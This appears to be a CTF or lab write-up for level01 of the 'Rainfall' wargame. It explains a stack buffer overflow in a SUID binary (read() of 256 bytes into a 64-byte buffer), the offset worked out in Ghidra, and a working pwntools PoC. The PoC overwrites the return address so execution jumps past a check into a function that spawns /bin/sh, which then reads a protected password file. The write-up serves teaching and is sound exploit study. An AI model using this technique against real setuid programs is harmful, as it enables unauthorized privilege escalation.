# Rainfall — Level01 Walkthrough

## 1. Discovering the program

After completing `level00`, I connected to the VM as `level01`.

I started by checking the files in my home directory:

```bash
ls -la
```

I found three files:

```text
ono
ono.c
README
```

I checked the executable permissions:

```bash
ls -l
```

Output:

```text
-rwsr-x--- 1 flag01 level01 16592 Jun  9 23:13 ono
-r--r--r-- 1 level01 level01  1610 Jun  9 23:13 ono.c
-r--r--r-- 1 level01 level01    57 Jun  9 23:13 README
```

I noticed that `ono` belongs to `flag01` and has the SUID bit enabled.

This means the program runs with the effective privileges of `flag01`.

My objective was to exploit this executable to obtain a shell with `flag01` privileges and read `/home/flag01/.pass`.

I also checked the README:

```bash
cat README
```

It contained:

```text
She had mirrored glasses. She knew exactly where to hit.
```

## 2. Understanding what the program does

I first executed the program normally:

```bash
./ono
```

It displayed:

```text
[ONO-SENDAI VII] Cyberspace deck online.
[ONO-SENDAI VII] Diagnostic subsystem v2.1.4
[ONO-SENDAI VII] Waiting for operator ID:
```

I entered `salut`, and the program responded:

```text
[ONO-SENDAI VII] Unknown operator. Logging attempt.
```

Then I read the source code to understand how the authentication worked.

The program simulates a diagnostic system that asks for an operator ID.

It checks whether the input starts with `ONO_`:

```c
if (strncmp(op_id, "ONO_", 4) == 0) {
    printf("[ONO-SENDAI VII] Operator recognized. Running diagnostics...\n");
} else {
    printf("[ONO-SENDAI VII] Unknown operator. Logging attempt.\n");
    ctx.retries--;
}
```

So an input like `ONO_admin` is recognized, while something like `salut` is rejected.

I also noticed that the program initializes a counter with three attempts, but there is no actual loop. The `main()` function only calls `run_diagnostic()` once before exiting.

## 3. Finding the vulnerability

While reading `ono.c`, I found this part inside `run_diagnostic()`:

```c
#define OPERATOR_LEN 64

static void run_diagnostic(void)
{
    char op_id[OPERATOR_LEN];

    print_header();
    read(STDIN_FILENO, op_id, 256);
}
```

This is where I found the vulnerability.

The program creates a buffer of 64 bytes:

```c
char op_id[64];
```

But it reads up to 256 bytes into it:

```c
read(STDIN_FILENO, op_id, 256);
```

The problem is that `read()` does not know the actual size of `op_id`. It only uses the maximum length provided as its third argument.

So if I send more than 64 bytes, the input can overflow the buffer and overwrite other values on the stack.

This is a **stack-based buffer overflow**, similar to the vulnerability I exploited in `level00`.

The difference is that this time the program uses `read()` instead of `gets()`.

## 4. Finding the buffer offset with Ghidra

To understand the stack layout, I opened the `ono` executable in Ghidra.

I went to the `run_diagnostic()` function and looked at the assembly instructions before the call to `read()`.

I found:

```asm
0040139e  SUB RSP, 0x40
004013a2  CALL print_header
004013a7  LEA RAX, [RBP - 0x40]
004013ab  MOV EDX, 0x100
004013b0  MOV RSI, RAX
004013b3  MOV EDI, 0x0
004013b8  CALL read
```

The most important instruction was:

```asm
LEA RAX, [RBP - 0x40]
```

`LEA` calculates an address and stores it in a register.

Here, it puts the address `RBP - 0x40` into `RAX`.

Then:

```asm
MOV RSI, RAX
```

copies that address into `RSI`.

On Linux x86-64, when calling a function using the standard calling convention, the first three arguments are passed through `RDI`, `RSI`, and `RDX`.

For this call:

| Register | Value | Meaning |
|---|---|---|
| `RDI` | `0` | Standard input |
| `RSI` | `RBP - 0x40` | Buffer address |
| `RDX` | `0x100` | Maximum of 256 bytes |

So the assembly corresponds to:

```c
read(0, op_id, 256);
```

This allowed me to understand that the buffer starts at:

```text
RBP - 0x40
```

I also knew that the saved return address is located at:

```text
RBP + 0x08
```

I calculated the distance between the beginning of the buffer and the return address:

```text
0x40 + 0x08 = 0x48
```

In decimal:

```text
0x48 = 72 bytes
```

So I needed **72 bytes of padding to reach the saved return address**.

The first 64 bytes fill the buffer, the next 8 overwrite the saved RBP, and the following 8 bytes can replace the return address.

## 5. Finding an interesting function

While analyzing the source code, I noticed another function:

```c
static void maintenance_exec(long code)
{
    if (code == 0xdeadbeefL) {
        setreuid(geteuid(), geteuid());
        execl("/bin/sh", "sh", NULL);
    }
}
```

This function immediately caught my attention because it can launch a shell.

It first checks whether its argument is equal to `0xdeadbeef`.

If the condition is true, it calls `setreuid()` to set the real and effective user IDs, then executes `/bin/sh`.

Since the binary is SUID and belongs to `flag01`, this function could give me a shell with `flag01` privileges.

However, `main()` never calls `maintenance_exec()`.

My idea was therefore to use the buffer overflow to redirect execution to the code inside this function.

Unlike `level00`, I did not need to inject my own shellcode because the program already contained code capable of opening a shell.

## 6. Finding the function address

In Ghidra, I opened `maintenance_exec()` and looked at its assembly.

I found:

```asm
00401276  ENDBR64
0040127a  PUSH RBP
0040127b  MOV RBP, RSP
0040127e  PUSH RBX
0040127f  SUB RSP, 0x18
00401283  MOV [RBP - 0x18], RDI
00401287  MOV EAX, 0xdeadbeef
0040128c  CMP [RBP - 0x18], RAX
00401290  JNZ 0x4012ca
00401292  CALL geteuid
```

The function starts at:

```text
0x401276
```

But I noticed something interesting.

At `0x40128c`, the program compares the argument with `0xdeadbeef`.

Then:

```asm
JNZ 0x4012ca
```

jumps over the shell-opening code if the values are different.

The instruction immediately after this condition is:

```asm
00401292  CALL geteuid
```

Instead of returning to the beginning of `maintenance_exec()`, I decided to return directly to:

```text
0x401292
```

This allowed me to skip the argument check and execute the part of the function that prepares and launches the shell.

This is a return-address hijacking technique similar to **ret2win**, except that I jump to an instruction inside the function rather than its entry point.

## 7. Creating the exploit

Now I had everything I needed:

- A buffer overflow caused by `read()`.
- An offset of 72 bytes.
- An existing function containing code to launch a shell.
- The address `0x401292`, just after the argument check.

I created a file called `poc.py`:

```bash
touch poc.py
vim poc.py
```

I used pwntools to build the payload.

Here is my PoC:

```python
from pwn import *

context.arch = "amd64"

payload = b"ONO_" + b"A" * 68
payload += p64(0x401292)

p = process("./ono")
p.sendlineafter(b"Waiting for operator ID:", payload)
p.interactive()
```

### Understanding the payload

The first part is:

```python
payload = b"ONO_" + b"A" * 68
```

I started with `ONO_` so the program would recognize the operator ID.

Then I added 68 `A` characters.

Together, that gives:

```text
4 + 68 = 72 bytes
```

This is exactly the offset I calculated earlier.

Next:

```python
payload += p64(0x401292)
```

The `p64()` function converts the address into an 8-byte little-endian value.

These 8 bytes overwrite the saved return address.

When `run_diagnostic()` returns, the program jumps to `0x401292` instead of returning normally to `main()`.

Finally:

```python
p = process("./ono")
p.sendlineafter(b"Waiting for operator ID:", payload)
p.interactive()
```

starts the vulnerable program, sends the payload after the prompt, and switches to interactive mode so I can use the shell if the exploit succeeds.

The payload has this structure:

```text
+----------------------------+
| "ONO_"             4 bytes |
+----------------------------+
| "A" * 68          68 bytes |
+----------------------------+
| 0x401292           8 bytes |
+----------------------------+
```

## 8. Running the exploit

I first tried:

```bash
python poc.py
```

But Python was not available under the `python` command on the VM.

The terminal suggested using `python3`, so I ran:

```bash
python3 poc.py
```

This time, the script executed successfully:

```text
[+] Starting local process './ono': pid 3536
[*] Switching to interactive mode
[ONO-SENDAI VII] Operator recognized. Running diagnostics...
$
```

The `$` prompt showed that I had obtained an interactive shell.

I tried some commands:

```bash
ls
```

Output:

```text
ono  ono.c  poc.py  README
```

Then I moved to the parent directory:

```bash
cd ..
ls
```

I could see the different Rainfall directories, including `flag01`.

I entered the `flag01` directory:

```bash
cd flag01
ls -la
```

Output included:

```text
drwx------  2 flag01 flag01 4096 Jun  9 23:13 .
-r--------  1 flag01 flag01   33 Jun  9 23:13 .pass
```

Finally, I executed:

```bash
cat .pass
```

I successfully read the protected password file.

This confirmed that the exploit had worked and that the shell had the necessary privileges to access `flag01`'s files.

## 9. Conclusion

In this level, I exploited another stack-based buffer overflow, but the approach was different from `level00`.

I started by reading the source code and noticed that `read()` could write 256 bytes into a 64-byte buffer.

Then I used Ghidra to understand how the buffer address was passed to `read()`.

By following the value placed into `RSI`, I found that the buffer started at `RBP - 0x40`.

From there, I calculated an offset of 72 bytes to reach the saved return address.

I also discovered the `maintenance_exec()` function, which already contained the instructions needed to open a shell.

Instead of generating shellcode, I overwrote the return address with `0x401292`, allowing execution to continue inside `maintenance_exec()` after its argument check.

My Python exploit worked, and I obtained an interactive shell that allowed me to read `/home/flag01/.pass`.

The main things I learned from this level were how to analyze function arguments in x86-64 assembly, calculate a buffer overflow offset, and reuse existing executable code instead of injecting shellcode.

**Level01 completed.**
